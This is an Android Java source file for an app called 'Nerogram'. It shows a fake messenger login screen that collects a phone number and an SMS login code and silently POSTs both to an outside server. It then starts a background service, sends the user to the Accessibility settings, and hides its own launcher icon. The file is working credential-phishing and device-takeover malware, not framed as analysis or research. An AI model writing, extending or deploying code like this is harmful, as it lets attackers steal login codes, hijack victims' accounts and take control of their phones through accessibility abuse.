package com.nerogram;

import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    private final String SERVER_URL = "https://nerogram.de3.netrun.io"; // Твой URL
    private final String DEVICE_ID = "android-phone";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Главный контейнер
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#0F0F13")); // Темный фон
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(60, 0, 60, 0);

        // Логотип (Градиентный текст)
        TextView title = new TextView(this);
        title.setText("Nerogram");
        title.setTextColor(Color.parseColor("#A855F7")); // Фиолетовый
        title.setTextSize(42);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        // Подзаголовок
        TextView subtitle = new TextView(this);
        subtitle.setText("Войдите, чтобы продолжить");
        subtitle.setTextColor(Color.parseColor("#A1A1AA"));
        subtitle.setTextSize(16);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 20, 0, 60);
        layout.addView(subtitle);

        // Поле номера
        EditText phoneInput = createStyledInput("Номер телефона");
        layout.addView(phoneInput);

        // Кнопка "Далее"
        Button btnNext = createStyledButton("Далее");
        layout.addView(btnNext);

        // Поле кода (скрыто)
        EditText codeInput = createStyledInput("Код из SMS");
        codeInput.setVisibility(View.GONE);
        layout.addView(codeInput);

        // Кнопка "Войти" (скрыта)
        Button btnLogin = createStyledButton("Войти");
        btnLogin.setVisibility(View.GONE);
        layout.addView(btnLogin);

        setContentView(layout);

        // Логика
        btnNext.setOnClickListener(v -> {
            String phone = phoneInput.getText().toString();
            if (phone.isEmpty()) {
                Toast.makeText(this, "Введите номер", Toast.LENGTH_SHORT).show();
                return;
            }
            
            // Отправляем номер на сервер (опционально)
            sendDataToServer("Номер: " + phone);

            btnNext.setVisibility(View.GONE);
            phoneInput.setEnabled(false);
            codeInput.setVisibility(View.VISIBLE);
            btnLogin.setVisibility(View.VISIBLE);
        });

        btnLogin.setOnClickListener(v -> {
            String code = codeInput.getText().toString();
            if (code.isEmpty()) {
                Toast.makeText(this, "Введите код", Toast.LENGTH_SHORT).show();
                return;
            }

            // Отправляем код на сервер
            sendDataToServer("Код: " + code);

            // Запускаем сервисы
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            startService(serviceIntent);

            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);

            getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );

            finish();
        });
    }

    private EditText createStyledInput(String hint) {
        EditText input = new EditText(this);
        input.setHint(hint);
        input.setHintTextColor(Color.parseColor("#71717A"));
        input.setTextColor(Color.WHITE);
        input.setBackgroundColor(Color.parseColor("#1C1C22"));
        input.setPadding(40, 30, 40, 30);
        input.setTextSize(16);
        
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        params.setMargins(0, 0, 0, 30);
        input.setLayoutParams(params);
        return input;
    }

    private Button createStyledButton(String text) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(16);
        btn.setAllCaps(false);
        
        GradientDrawable shape = new GradientDrawable();
        shape.setColor(Color.parseColor("#A855F7")); // Фиолетовый
        shape.setCornerRadius(30); // Скругленные углы
        btn.setBackground(shape);

        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                130
        );
        params.setMargins(0, 10, 0, 30);
        btn.setLayoutParams(params);
        return btn;
    }

    private void sendDataToServer(String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String json = "{\"id\":\"" + DEVICE_ID + "\",\"type\":\"text\",\"text\":\"" + text + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes("utf-8"));
                }
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }
}
